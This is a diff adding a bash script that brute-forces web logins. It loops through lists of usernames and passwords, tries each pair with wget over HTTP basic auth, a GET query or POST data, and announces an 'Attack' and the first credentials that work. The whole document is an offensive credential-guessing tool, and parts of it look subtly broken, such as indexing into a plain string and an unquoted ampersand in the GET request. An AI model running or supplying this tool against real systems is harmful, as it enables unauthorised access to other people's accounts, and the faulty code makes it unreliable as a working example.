@@ -1,0 +1,81 @@
+#!/bin/bash
+
+req 'wget'
+
+usage="Usage:\t<url> <usernames> <passwords> [ -c <connection-protocol> ] [ -d <delay> ] [ -p(ost) <name> <pass> ] [ -g(et) <name> <pass> ]"
+url=
+usernames=
+passwords=
+delay=0
+post_or_get_args=
+type="ht"
+protocol="http"
+
+if [ ! -z "$3" ]; then
+	url="$1"
+	usernames="$2"
+	passwords="$3"
+else
+	echo -e "$usage"
+	exit
+fi
+
+while getopts "c:d:p:g:" opt; do
+	case $opt in
+		c)
+			protocol=$OPTARG
+			;;
+		d)
+			delay=$OPTARG
+			;;
+		p)
+			post_or_get_args+="$OPTARG"
+			type=p
+			;;
+		g)
+			post_or_get_args+="$OPTARG"
+			type=g
+			;;
+		\?)
+			echo "Invalid option: -$OPTARG"
+			;;
+	esac
+done
+
+un=$post_or_get_args[0]
+pwd=$post_or_get_args[1]
+
+echo "starting Attack on $protocol://$url"
+
+for username in $usernames
+do
+	for password in $passwords
+	do
+		case $type in
+			ht)
+				if wget --spider $protocol://$username:$password@$url &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				;;
+			g)
+				if wget $protocol://$url?$un=$username&$pwd=$password &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				;;
+			p)
+				if wget --post-data "$un=$username&$pwd=$password" $protocol://$url &>/dev/null; then
+					echo -e "\n\"$username\" : \"$password\" worked out\n"
+					exit
+				fi
+				;;
+			\?)
+				echo "invalid attack type"
+				exit
+				;;
+		esac
+		sleep "$delay"
+	done
+done
+echo "didnt work."
